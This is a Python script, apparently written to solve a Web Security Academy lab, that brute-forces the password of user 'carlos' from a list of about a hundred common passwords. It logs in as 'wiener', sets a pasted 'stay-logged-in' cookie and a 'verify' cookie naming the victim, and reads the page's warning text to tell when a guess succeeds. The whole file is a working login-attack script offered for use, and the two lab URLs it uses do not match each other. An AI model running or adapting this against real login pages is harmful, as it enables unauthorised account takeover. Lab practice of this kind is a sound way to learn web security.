import requests
import itertools
import bs4
session = requests.Session()

password = [
  "123456",
  "password",
  "12345678",
  "qwerty",
  "123456789",
  "12345",
  "1234",
  "111111",
  "1234567",
  "dragon",
  "123123",
  "baseball",
  "abc123",
  "football",
  "monkey",
  "letmein",
  "shadow",
  "master",
  "666666",
  "qwertyuiop",
  "123321",
  "mustang",
  "1234567890",
  "michael",
  "654321",
  "superman",
  "1qaz2wsx",
  "7777777",
  "121212",
  "000000",
  "qazwsx",
  "123qwe",
  "killer",
  "trustno1",
  "jordan",
  "jennifer",
  "zxcvbnm",
  "asdfgh",
  "hunter",
  "buster",
  "soccer",
  "harley",
  "batman",
  "andrew",
  "tigger",
  "sunshine",
  "iloveyou",
  "2000",
  "charlie",
  "robert",
  "thomas",
  "hockey",
  "ranger",
  "daniel",
  "starwars",
  "klaster",
  "112233",
  "george",
  "computer",
  "michelle",
  "jessica",
  "pepper",
  "1111",
  "zxcvbn",
  "555555",
  "11111111",
  "131313",
  "freedom",
  "777777",
  "pass",
  "maggie",
  "159753",
  "aaaaaa",
  "ginger",
  "princess",
  "joshua",
  "cheese",
  "amanda",
  "summer",
  "love",
  "ashley",
  "nicole",
  "chelsea",
  "biteme",
  "matthew",
  "access",
  "yankees",
  "987654321",
  "dallas",
  "austin",
  "thunder",
  "taylor",
  "matrix",
  "mobilemail",
  "mom",
  "monitor",
  "monitoring",
  "montana",
  "moon",
  "moscow"
]

url = "https://0a9b007c045d11df81d1983b00980002.web-security-academy.net/login"
data = {"username": "wiener", "password": "peter"}
r = session.post(url, data=data)
session.cookies.set("stay-logged-in","d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw")
url = "https://0af000d303ddd5c28026da3b00eb005b.web-security-academy.net/login2"
session.cookies.set("verify", "carlos")
for x in password:
    data = {"username": "carlos", "password": x}
    r = session.post(url, data=data)
    print(r.text)
    soup = bs4.BeautifulSoup(r.text, features="html.parser")
    page = soup.find_all('p', class_='is-warning')
    text = ""
    for p in page:
        text = p.text
    if text == "Invalid username or password.":
        print(f"Incorrect pass {x}")
    else:
        print(f"correct pass {x}")
        break
